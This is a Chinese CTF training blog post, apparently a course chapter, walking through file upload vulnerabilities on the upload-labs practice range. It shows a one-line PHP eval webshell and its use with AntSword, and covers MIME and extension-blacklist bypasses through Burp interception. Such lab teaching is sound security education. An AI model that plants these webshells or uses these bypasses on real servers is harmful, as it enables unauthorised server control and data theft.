@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 8.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/sign.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/small.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"hnu-legend1440.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="飞书链接:https:&#x2F;&#x2F;icnewi51k2yp.feishu.cn&#x2F;wiki&#x2F;EIIywCXJOif6XmksNIfcbsq4nbf?from&#x3D;from_copylink [Week6.1]蚁剑安装和文件上传绪论蚁剑安装对 CTF Web 学习者，蚁剑是上传后门文件后的核心管理工具。它能帮你可视化浏览服务器文件系统，快速找到并读取 &#x2F; 下载 flag；也可直接执行系统命令（如 ls、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="第六章-文件上传">
+<meta property="og:url" content="http://hnu-legend1440.com/2026/01/21/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="拂云观 · legend1440">
+<meta property="og:description" content="飞书链接:https:&#x2F;&#x2F;icnewi51k2yp.feishu.cn&#x2F;wiki&#x2F;EIIywCXJOif6XmksNIfcbsq4nbf?from&#x3D;from_copylink [Week6.1]蚁剑安装和文件上传绪论蚁剑安装对 CTF Web 学习者，蚁剑是上传后门文件后的核心管理工具。它能帮你可视化浏览服务器文件系统，快速找到并读取 &#x2F; 下载 flag；也可直接执行系统命令（如 ls、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hnu-legend1440.com/images/QZl0bEDO2o96Z6xV1kVcGuown76.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/JjE0bectco81GLxAx4EcQLojnzc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/INrZbWzJhoxjhuxoSIvc2wWWnP4.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/TmWsb4dPdoXWRtxXpoEcdn7LnGe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/R4IhbElMWosVF1xn6UacwQbWnhb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/StCqbmznSopeaExsjagc9cxOnQf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/SHZGbT2xAoPl5SxzlMVcyc5cnHg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Os58bi4llot6mGxWFaFcC3Ignaf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/LcJFbafQtoQh45xeWSJcFrzSnuq.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/LM2qbCVPEoJhLAxZ4CgcJSmkneb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Ikf8bbx5IoWRvRxK48scFylqnXf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/XKAobPdHKoZxS3xm0JrcetLynZd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/FqfpbbjncoH5Xgxj19lclgyWnBb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/RcQMbwvYooTBVGx7LNKcNEAXnae.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/XRHWbXiguoWd6ExtYwjcfjqJnLb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/TNBvbX76MoEXQex83DDcx389n4g.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/GeksbaBcCortyKxNWWsc9eJqn7e.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/GmTrbvLsPoGOxyxvLtwcNOjjnDe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/NNJVbhbVSoFtEExnKA1cx1mbnkb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/PraebRmLxol0A1xEsD4cWAtdnLf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/OfwpbiiEkotguwxAtaDcyqT1nId.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/GSAXbCx5AovpIBxqImKc2zOnnZg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/CXDGbhm67oV5BZx8AFVccVn4nbh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/H5V4bbNUYoccFyxTG63c98gGn0b.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/JRg4bJakXoYJVmxIZ8kct6kQnhh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/OxwwbvGgGokkhAxEAHTc5N9CnJe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/WwKWbagktooGf6xwQNLcZOYjnig.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/UsiEbCzAQoMrYqxtybVcyM0Tn2l.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/PNY2bKYSCoQU2BxTQWVcL85mnie.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/RrTnbUcPvoZj7jx9mm9cm0UtnBb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/K5EgbkOreoPQD2xApMvc8WLmnSd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/JZFUbybfwokcccxzwp9c03L0nWb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/MxHybNc6goU5eGxhiX5ciaT3n4b.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Tl9Pb2NVGoe6uUxW6DFcpivBnff.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/GBhSbdyJBoZ8qLx04a6c1GlVn1c.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/SZdKb2MPio5Uvfxoz12ckU8Pnfg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/KxSWbgJ8ooEuSwxnz73cDnUanZf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/L80rbZOrOoN7N1xyQIAczalPnpd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/L4Nkb9d9aoRpLWxbyeEcsvwbnob.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/JCmObDCTwoBfrHxvbIecDdS6n0g.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/NJPObeHQSobtc7xrQpQcQrjSngd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/HayhbBY9SoB6wmxoyIHcb1mmn1e.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/WToObcioToj1QmxzUuvcFJYAnce.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/KGZPbgNRioTidexEGOwcIo0dnlg.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/QxpZblUvlomU6Dxzl70cEFYNnqi.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/L6TQb7pFJo3QKPxSUsrc2ck9nmc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/HPnrbVxMRoVPrBxEAs2crPzFn6e.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/YcljbY7DZonGPixNxg7cbyvpnzd.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Ueg4btZPioAciYxN6a4clW6Un8d.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/P8afbTeV6oDkrOxRZErc1EhknZK.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/QzWGbTsyYoOQqpxD6G4cY7xJnng.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/VSDcbz4RCobPxnx4R6Kc7DTjnig.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/UjiwbGQz9oC2G3xfNO8cf86rnRe.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/QkQQbCB6Eo6tdgxXLFgcDTijnpf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/VO7ib0TBRoLSiFx0uB0cMpyGn4d.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/W19hbEon9ovi7Vxta3AcBHROnBc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Ln9cbZVYbozOJEx3vYecIKGTnuc.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/F3vDbCYAtoVOwExfFDNcJKcwnMb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/RrodbwjZKoO45rxp5jNcJKMdngf.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/SJtRb6L2ho8pTyxbqNDch0FFnjh.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Wngdbs6HYo7hPpxwICDc9YxVn8g.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/N7h6bxtHPo9j1pxS5Uics168nie.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/Ch0WbNaSyow7mJx1DrVcBBl1nMb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/X6GEbjJHloAslTxNIDmcYndPnxr.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/TtjEbXdB4oU4ZMxBfCfczuZgnde.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/IyVqbltdZoCzmyxcUldcYhrfnvb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/TD7BbfhACoMrA4xUL2YclxXdnpb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/SaNPbu1HPoJ6AzxjqJ2c9JOJnyb.png">
+<meta property="og:image" content="http://hnu-legend1440.com/images/OZIdbkYk5oEln6x9LJgc24FBnrf.png">
+<meta property="article:published_time" content="2026-01-20T17:42:22.000Z">
+<meta property="article:modified_time" content="2026-01-20T17:46:00.749Z">
+<meta property="article:author" content="legend1440">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hnu-legend1440.com/images/QZl0bEDO2o96Z6xV1kVcGuown76.png">
+
+<link rel="canonical" href="http://hnu-legend1440.com/2026/01/21/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>第六章-文件上传 | 拂云观 · legend1440</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">拂云观 · legend1440</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-schedule">
+
+    <a href="/categories/schedule/" rel="section"><i class="fa fa-skating fa-fw"></i>期末突击</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-chess fa-fw"></i>往世乐土</a>
+
+  </li>
+        <li class="menu-item menu-item-training">
+
+    <a href="/categories/training/" rel="section"><i class="fa fa-yin-yang fa-fw"></i>集训修行</a>
+
+  </li>
+        <li class="menu-item menu-item-wp">
+
+    <a href="/categories/WP/" rel="section"><i class="fa fa-feather fa-fw"></i>全面战场</a>
+
+  </li>
+        <li class="menu-item menu-item-puzzles">
+
+    <a href="/categories/puzzles/" rel="section"><i class="fa fa-spa fa-fw"></i>练习札记</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://hnu-legend1440.com/2026/01/21/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="legend1440">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="拂云观 · legend1440">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          第六章-文件上传
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2026-01-21 01:42:22 / 修改时间：01:46:00" itemprop="dateCreated datePublished" datetime="2026-01-21T01:42:22+08:00">2026-01-21</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/training/" itemprop="url" rel="index"><span itemprop="name">-training</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>飞书链接:<a target="_blank" rel="noopener" href="https://icnewi51k2yp.feishu.cn/wiki/EIIywCXJOif6XmksNIfcbsq4nbf?from=from_copylink">https://icnewi51k2yp.feishu.cn/wiki/EIIywCXJOif6XmksNIfcbsq4nbf?from=from_copylink</a></p>
+<h1 id="Week6-1-蚁剑安装和文件上传绪论"><a href="#Week6-1-蚁剑安装和文件上传绪论" class="headerlink" title="[Week6.1]蚁剑安装和文件上传绪论"></a>[Week6.1]蚁剑安装和文件上传绪论</h1><h2 id="蚁剑安装"><a href="#蚁剑安装" class="headerlink" title="蚁剑安装"></a>蚁剑安装</h2><p>对 CTF Web 学习者，蚁剑是<strong>上传后门文件</strong>后的核心管理工具。它能帮你可视化浏览服务器文件系统，快速找到并读取 &#x2F; 下载 flag；也可直接执行系统命令（如 ls、whoami），实现服务器基础控制，无需手动反复输命令。其作用是将漏洞利用落地，让从 “找漏洞” 到 “拿权限” 更高效，是 CTF Web 题中获取服务器权限的常用工具。</p>
+<p><img src="/images/QZl0bEDO2o96Z6xV1kVcGuown76.png"></p>
+<h2 id="文件上传绪论"><a href="#文件上传绪论" class="headerlink" title="文件上传绪论"></a>文件上传绪论</h2><ol>
+<li><strong>漏洞到底是什么</strong></li>
+</ol>
+<p>网站里常见上传头像、附件这类功能，正常是传图片、文档这类无害文件的。但要是网站后台没做好文件检查，攻击者就能传恶意脚本文件（比如一句话木马），这就是文件上传漏洞。简单说，就是网站的 “文件安检” 出了问题，让危险文件混进了服务器。</p>
+<ol>
+<li><strong>漏洞能用来干嘛</strong></li>
+</ol>
+<p>攻击者传的恶意文件大多是叫 Webshell 的后门文件，传成功后就能控制服务器了。比如浏览服务器里的所有文件找 CTF 里的 flag，执行系统命令查看服务器信息，甚至篡改网站内容、偷取数据，危害特别大。</p>
+<ol>
+<li><strong>为啥会出现这漏洞</strong></li>
+</ol>
+<p>根源是网站的安全防护不到位。比如只在网页端用简单代码检查文件类型，很容易被绕过；或者只列了少数危险文件的黑名单，攻击者换个特殊后缀就蒙混过关了；还有的服务器没设置好权限，让上传目录里的文件能直接执行，这些都会催生漏洞。</p>
+<ol>
+<li><strong>CTF 里常见的利用小思路</strong></li>
+</ol>
+<p>新手在 CTF 题里常会遇到 “图片马” 这种利用方式。比如把正常图片和一句话木马文件拼在一起生成新图片，网站检查时只看到是图片就允许上传。之后再通过工具让服务器解析这个图片里的恶意代码，就能连接服务器找 flag 了。</p>
+<h2 id="文件上传的进行"><a href="#文件上传的进行" class="headerlink" title="文件上传的进行"></a>文件上传的进行</h2><h3 id="大致思路"><a href="#大致思路" class="headerlink" title="大致思路"></a>大致思路</h3><p>绕过文件上传验证的规则，或者伪造正确文件，达到上传脚本文件的目的。</p>
+<p>例如，我们可以尝试通过修改脚本文件后缀名（.php)为网站允许的正常文件类型（如.jpg），或者通过抓包修改 <a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=215690360&content_type=Article&match_order=1&q=MIME%E4%BF%A1%E6%81%AF&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjUxNjM0NTgsInEiOiJNSU1F5L-h5oGvIiwiemhpZGFfc291cmNlIjoiZW50aXR5IiwiY29udGVudF9pZCI6MjE1NjkwMzYwLCJjb250ZW50X3R5cGUiOiJBcnRpY2xlIiwibWF0Y2hfb3JkZXIiOjEsInpkX3Rva2VuIjpudWxsfQ.LWsWzMzkcEiO03V1kNd-yMwWPyzKPppYk20T9kFxtvc&zhida_source=entity">MIME 信息</a></p>
+<p>达到绕过目的。</p>
+<h3 id="“恶意文件”-的含义与-“一句话木马”"><a href="#“恶意文件”-的含义与-“一句话木马”" class="headerlink" title="“恶意文件” 的含义与 “一句话木马”"></a>“恶意文件” 的含义与 “一句话木马”</h3><p>文章里反复提 “Webshell”恶意脚本”，对零基础来说不用记复杂的，先聚焦最常用的<strong>一句话木马</strong>（CTF 题里 90% 会遇到）：它是一行超短的代码，比如 PHP 语言的 <code>&lt;?php @eval($_POST[&#39;pass&#39;]);?&gt;</code>，作用是 “给服务器留个遥控器”—— 你把它藏在文件里传上服务器后，用蚁剑输入 “密码（pass）”，就能操控服务器。</p>
+<p><strong>为什么它危险？</strong></p>
+<p>就像你把家里的 “备用钥匙” 藏在门口地毯下（传木马文件），别人找到钥匙（用工具连接），就能随便进你家翻东西（读服务器文件、找 flag）、用你家设备（执行系统命令）。</p>
+<h3 id="文件上传常见验证"><a href="#文件上传常见验证" class="headerlink" title="文件上传常见验证"></a>文件上传常见验证</h3><ul>
+<li>后缀名，类型，文件头等</li>
+<li>后缀名黑名单或白名单</li>
+<li>文件类型：MIME 信息</li>
+<li>文件头：内容头信息</li>
+</ul>
+<h3 id="明确哪些参数能用抓包工具修改"><a href="#明确哪些参数能用抓包工具修改" class="headerlink" title="明确哪些参数能用抓包工具修改"></a><strong>明确哪些参数能用抓包工具修改</strong></h3><p><a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=215690360&content_type=Article&match_order=1&q=Content-Disposition&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjUxNjM0NTgsInEiOiJDb250ZW50LURpc3Bvc2l0aW9uIiwiemhpZGFfc291cmNlIjoiZW50aXR5IiwiY29udGVudF9pZCI6MjE1NjkwMzYwLCJjb250ZW50X3R5cGUiOiJBcnRpY2xlIiwibWF0Y2hfb3JkZXIiOjEsInpkX3Rva2VuIjpudWxsfQ.phpKJ0FnFt2Q_Q9ICR2ow8NsC-8yJHTmv3pdVci6L4g&zhida_source=entity">Content-Disposition</a>：一般可更改</p>
+<p>name：表单参数值，不可更改</p>
+<p>filename：文件名，可以更改</p>
+<p><a target="_blank" rel="noopener" href="https://zhida.zhihu.com/search?content_id=215690360&content_type=Article&match_order=1&q=Content-Type&zd_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ6aGlkYV9zZXJ2ZXIiLCJleHAiOjE3NjUxNjM0NTgsInEiOiJDb250ZW50LVR5cGUiLCJ6aGlkYV9zb3VyY2UiOiJlbnRpdHkiLCJjb250ZW50X2lkIjoyMTU2OTAzNjAsImNvbnRlbnRfdHlwZSI6IkFydGljbGUiLCJtYXRjaF9vcmRlciI6MSwiemRfdG9rZW4iOm51bGx9.19_McGuUpn-sy8CydmG2ufSKPCHoE8Qvnx0R4RvVY9U&zhida_source=entity">Content-Type</a>：文件 MIME，视情况更改</p>
+<p><strong>下面我们用一个示例,来解释文件上传的全流程</strong></p>
+<p><del>管你听没听懂，看就完了</del></p>
+<h2 id="文件上传的举例-labs-1-流程"><a href="#文件上传的举例-labs-1-流程" class="headerlink" title="文件上传的举例(labs-1 流程)"></a>文件上传的举例(labs-1 流程)</h2><p><em>这个举例做了他妈一上午啊</em></p>
+<p>我们来到 upload-labs-1</p>
+<p><img src="/images/JjE0bectco81GLxAx4EcQLojnzc.png"></p>
+<p>要你上传一个图片,按理说我们只要不听他的话,上传一个你想执行 php 文件,然后再用文件包含的方式执行它就能得到 flag 了</p>
+<p>但是我们打开网页源代码,发现 php 文件根本不允许上传</p>
+<p><img src="/images/INrZbWzJhoxjhuxoSIvc2wWWnP4.png"></p>
+<p>于是我们就想到先写个 php,再试着传 jpg,在传的瞬间使用 Burp 拦截,改成 php 就能绕过了</p>
+<p>我们写个 flag.php,里面是我们想要执行的指令,这里加一个命令执行和 POST 变量 password,以便介绍蚁剑的使用</p>
+<p><img src="/images/TmWsb4dPdoXWRtxXpoEcdn7LnGe.png"></p>
+<p>把拓展名改成 jpg,用 Burp 内嵌浏览器在 Burp 拦截下上传</p>
+<p><img src="/images/R4IhbElMWosVF1xn6UacwQbWnhb.png"></p>
+<p><img src="/images/StCqbmznSopeaExsjagc9cxOnQf.png"></p>
+<p>选择文件,打开拦截</p>
+<p><img src="/images/SHZGbT2xAoPl5SxzlMVcyc5cnHg.png"></p>
+<p><img src="/images/Os58bi4llot6mGxWFaFcC3Ignaf.png"></p>
+<p>点击上传文件,上传被拦截,Burp 显示报告,我们将 flag.jpg 改成 flag.php,点击放行</p>
+<p><img src="/images/LcJFbafQtoQh45xeWSJcFrzSnuq.png"></p>
+<p>flag.php 就正常地被上传了,我们找到靶场的上传路径</p>
+<p><img src="/images/LM2qbCVPEoJhLAxZ4CgcJSmkneb.png"></p>
+<p>关闭拦截,输进 URL,指令被执行了</p>
+<p><img src="/images/Ikf8bbx5IoWRvRxK48scFylqnXf.png"></p>
+<h2 id="蚁剑获取网页文件"><a href="#蚁剑获取网页文件" class="headerlink" title="蚁剑获取网页文件"></a>蚁剑获取网页文件</h2><p>刚才我们用文件上传的方式执行了 lunix 命令,下面我们还可以使用蚁剑获取网页文件.</p>
+<p><img src="/images/XKAobPdHKoZxS3xm0JrcetLynZd.png"></p>
+<p>打开蚁剑添加数据,输入 flag.php 所在的地址以及刚刚的命令执行 post 变量,点测试连接报成功,直接点添加即可</p>
+<p><img src="/images/FqfpbbjncoH5Xgxj19lclgyWnBb.png"></p>
+<h1 id="Week6-2-实验-文件上传漏洞举例"><a href="#Week6-2-实验-文件上传漏洞举例" class="headerlink" title="[Week6.2]实验:文件上传漏洞举例"></a>[Week6.2]实验:文件上传漏洞举例</h1><p>文件上传的漏洞种类有很多,这里按理论 + 实验的方式逐个介绍</p>
+<p>(pass-1 属于前端效验，即浏览器自行效验，后面则全为后端效验)</p>
+<h2 id="后端-MIME-类型校验"><a href="#后端-MIME-类型校验" class="headerlink" title="后端 MIME 类型校验"></a><strong>后端 MIME 类型校验</strong></h2><ul>
+<li>什么是 MIME 类型？：文件的 “身份标识”，比如.jpg 的 MIME 是 <code>image/jpeg</code>，.php 的 MIME 是 <code>application/x-httpd-php</code></li>
+<li>题目漏洞：网站只看 MIME 类型是不是 “图片”，不看文件实际是啥。咱们用 Burp 把 <code>shell.php</code> 的 MIME 改成图片的，网站就会放行！</li>
+</ul>
+<h3 id="pass-02-实验举例"><a href="#pass-02-实验举例" class="headerlink" title="pass-02 实验举例"></a>pass-02 实验举例</h3><p>我们来到 pass-02,点显示源码,看到有对一些变量是否是”image&#x2F;jpeg”的判断,可知本题是绕过<strong>后端 MIME 类型校验题</strong></p>
+<p><img src="/images/RcQMbwvYooTBVGx7LNKcNEAXnae.png"></p>
+<p>我们用 Burp 直接传木马</p>
+<p><img src="/images/XRHWbXiguoWd6ExtYwjcfjqJnLb.png"></p>
+<p>开启拦截点击上传,找到本行代表 MIME 值,修改成我们需要的 image&#x2F;jpeg,点放行</p>
+<p><img src="/images/TNBvbX76MoEXQex83DDcx389n4g.png"></p>
+<p>运行通过</p>
+<p><img src="/images/GeksbaBcCortyKxNWWsc9eJqn7e.png"></p>
+<h2 id="后缀名黑名单校验"><a href="#后缀名黑名单校验" class="headerlink" title="后缀名黑名单校验"></a><strong>后缀名黑名单校验</strong></h2><p><strong>怎么判断是 “黑名单校验”？（还是用 2 次上传实验）</strong></p>
+<ul>
+<li>第一次：上传 <code>shell.php</code>（纯 PHP 后缀），页面提示 “不允许上传.php 类型文件”—— 明确告诉你 “禁止某个后缀”，不是 MIME 校验（MIME 会提示 “文件类型不正确”）；</li>
+<li>第二次：上传 <code>shell.jpg</code>（正常图片），能成功上传 —— 说明只拦 “黑名单里的后缀”，允许的后缀能直接过。</li>
+</ul>
+<p><strong>黑名单漏洞在哪？</strong></p>
+<p>PHP 除了 <code>.php</code> 后缀，还有很多 “能被服务器解析成 PHP 代码” 的变种后缀（比如 <code>.php5</code>、<code>.phtml</code>、<code>.php3</code> 等），Pass-3 的黑名单只禁了 <code>.php</code>，没禁这些变种，咱们用它们就能伪装！</p>
+<p>如果 <code>.php5</code> 不行（极少数情况服务器没配置解析），还能试这些 PHP 变种后缀（Pass-3 黑名单都没禁）：</p>
+<ul>
+<li><code>.phtml</code>、<code>.php3</code>、<code>.php4</code>、<code>.php7</code>、<code>.phps</code>（选一个改文件名即可，比如 <code>shell.phtml</code>）</li>
+</ul>
+<h3 id="pass-03-实验举例"><a href="#pass-03-实验举例" class="headerlink" title="pass-03 实验举例"></a>pass-03 实验举例</h3><p>我们打开源代码,发现本题过滤了 php 文件</p>
+<p><img src="/images/GmTrbvLsPoGOxyxvLtwcNOjjnDe.png"></p>
+<p>我们直接传一个 php5 文件</p>
+<p><img src="/images/NNJVbhbVSoFtEExnKA1cx1mbnkb.png"></p>
+<p>不用拦截,直接点击上传就成功了,但发现有的格式他不会解析,直接回显的是源代码,换其他的格式即可</p>
+<p>实际上,根据 pass-04 源代码,我们发现还有很多可行的绕过方式</p>
+<h3 id="更多可行的绕过方式"><a href="#更多可行的绕过方式" class="headerlink" title="更多可行的绕过方式"></a>更多可行的绕过方式</h3><p><img src="/images/PraebRmLxol0A1xEsD4cWAtdnLf.png"></p>
+<p>首尾加空格,用::$DATA 字符串,用大小写混合,在末尾加点等等,这些分别对应了 lab5-8 解题</p>
+<p>注意 windows 系统下这些拓展名可能起不出,可以用 Burp 修改</p>
+<p>::DATA 字符串我们不熟悉,可以看看</p>
+<p><img src="/images/OfwpbiiEkotguwxAtaDcyqT1nId.png"></p>
+<h2 id="非-php-解析方式-绕过-“超强后缀黑名单”（-htaccess-大法）"><a href="#非-php-解析方式-绕过-“超强后缀黑名单”（-htaccess-大法）" class="headerlink" title="[非 php 解析方式]绕过 “超强后缀黑名单”（.htaccess 大法）"></a>[非 php 解析方式]绕过 “超强后缀黑名单”（.htaccess 大法）</h2><p><strong>怎么判断是 “超强黑名单”？</strong></p>
+<ul>
+<li>试上传前 3 关能用的后缀：<code>shell.php</code>（提示禁止）、<code>shell.php5</code>（禁止）、<code>shell.phtml</code>（禁止）—— 几乎所有 PHP 相关后缀都被拦了；</li>
